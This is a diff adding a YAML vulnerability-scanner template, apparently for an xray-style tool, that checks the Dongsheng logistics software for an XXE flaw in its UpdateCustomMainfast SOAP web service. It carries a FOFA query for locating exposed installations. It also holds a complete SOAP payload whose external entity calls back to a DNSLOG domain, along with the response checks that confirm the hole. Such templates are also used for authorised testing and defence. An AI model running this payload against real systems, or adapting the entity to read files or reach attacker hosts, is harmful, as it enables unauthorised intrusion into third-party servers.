@@ -1,0 +1,31 @@
+id: poc-yaml-dongshengsoft-updatecustommainfast-xxe
+info:
+  name: 东胜物流软件 UpdateCustomMainfast XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 东胜物流软件
+  fofa: app="东胜物流软件-物流软件"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /Webservice/DsWebService.asmx
+  headers:
+    Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/UpdateCustomMainfast"
+  data: "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:dsw=\"\
+    DsWebService\">\n   <soap:Header/>\n   <soap:Body>\n      <dsw:UpdateCustomMainfast>\n\
+    \         <!--Optional:-->\n         <dsw:Xdoc><![CDATA[<!DOCTYPE test [<!ENTITY\
+    \ xxe SYSTEM \"http://{{.domain}}\">]><test>&xxe;</test>]]></dsw:Xdoc>\n     \
+    \    <!--Optional:-->\n         <dsw:XdocAfter>1</dsw:XdocAfter>\n         <!--Optional:-->\n\
+    \         <dsw:Corpid>1</dsw:Corpid>\n         <!--Optional:-->\n         <dsw:SenderOp>1</dsw:SenderOp>\n\
+    \         <!--Optional:-->\n         <dsw:SenderHandphone>1</dsw:SenderHandphone>\n\
+    \         <!--Optional:-->\n         <dsw:SenderEmail>1</dsw:SenderEmail>\n  \
+    \       <!--Optional:-->\n         <dsw:SenderFax>1</dsw:SenderFax>\n        \
+    \ <!--Optional:-->\n         <dsw:Mblno>1</dsw:Mblno>\n      </dsw:UpdateCustomMainfast>\n\
+    \   </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 200 && contains(body,"DsWebService") && contains(body,"System.Net.WebException")
+    && contains(content_type,"application/soap+xml") && reverse.Verify()
+transport: http
